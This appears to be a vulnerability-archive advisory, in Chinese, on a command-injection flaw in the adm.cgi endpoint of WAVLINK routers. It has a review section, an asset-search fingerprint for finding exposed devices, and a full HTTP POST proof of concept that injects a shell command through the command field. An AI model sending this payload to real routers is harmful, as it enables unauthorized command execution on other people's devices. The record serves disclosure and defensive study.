---
source: "wy876 漏洞文库"
id: "vw-f0737f5a5101d61198b4384a"
entity_id: "ve-f0737f5a5101d61198b4384a"
schema_version: "1"
fofa_unverified: "web.body="
title: "WAVLINK adm.cgi命令执行漏洞"
product: "WAVLINK列五型号路由器"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无固件或认证条件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Wavlink/WAVLINKadm.cgi%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ur96lfz8saqpabto"
source_status: "recorded"
---

# WAVLINK adm.cgi命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：WAVLINK列五型号路由器
- 本文讨论：adm.cgi sysCMD command命令注入
- 版本、权限与配置前提：无固件或认证条件
- 资料类型：请求PoC摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无响应或源码，仅请求与外链yaml；fofa误录Hunter残缺字段
- 型号跨固件泛化，缺修复版本
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 命令接口预期权限与漏洞边界、型号覆盖待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
WAVLINK是中国睿因科技（WAVLINK）公司开发的一款路由器，该系统adm.cgi文件存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。包含型号WN530HG4、WN531G3、WN572HG3、WN535G3、WN575A4等。

# 二、影响版本
+ wavlink 路由器

# 三、资产测绘
+ hunter`web.body="firstFlage"`
+ 特征


# 四、漏洞复现
```http
POST /cgi-bin/adm.cgi HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

page=sysCMD&command=";id;"
```


nuclei脚本

[wanlink-router-adm-cgi-rce.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222231419-b11f1277-6ff4-4254-8a64-b9fd783e0f85.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ur96lfz8saqpabto>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
